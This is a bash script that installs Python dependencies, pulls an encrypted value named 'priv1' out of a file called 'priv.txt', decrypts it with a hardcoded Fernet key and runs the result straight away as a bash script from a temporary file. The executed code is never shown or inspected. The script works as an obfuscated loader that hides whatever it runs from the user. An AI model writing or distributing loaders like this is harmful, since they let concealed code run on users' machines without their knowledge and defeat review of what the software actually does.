#!/bin/bash

if ! python3 -c "import requests" &> /dev/null; then
    pip3 install requests
fi

if ! python3 -c "import cryptography" &> /dev/null; then
    pip3 install cryptography
fi

TEMP_SCRIPT=$(mktemp)

python3 - << EOF
from cryptography.fernet import Fernet
import sys
import os

none = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA='
cipher_suite = Fernet(none)

script_dir = os.path.dirname(os.path.abspath(__file__))
env_file = os.path.join(os.path.dirname(script_dir), 'priv.txt')

try:
    print(f"Reading from file: {env_file}")
    with open(env_file, 'r') as f:
        content = f.read()

    import re
    match = re.search(r'priv1=(.*?)(?:\n\w+\=|$)', content, re.DOTALL)
    if match:
        encrypted_data = match.group(1).replace('\n', '').strip().encode()
        print("Found encrypted data")
        print("Attempting to decrypt...")

        decrypted_data = cipher_suite.decrypt(encrypted_data)
        print("Successfully decrypted.")

        with open('${TEMP_SCRIPT}', 'w') as f:
            f.write(decrypted_data.decode())
        print("Decrypted bash script saved to temporary file")
    else:
        print("Error: priv1 not found in priv.txt")
        sys.exit(1)
except Exception as e:
    print(f"Error: {str(e)}")
    import traceback
    traceback.print_exc()
    sys.exit(1)
EOF

if [ $? -eq 0 ]; then
    echo "Executing decrypted bash script..."
    bash "$TEMP_SCRIPT"

    rm -f "$TEMP_SCRIPT"
else
    rm -f "$TEMP_SCRIPT"
    exit 1
fi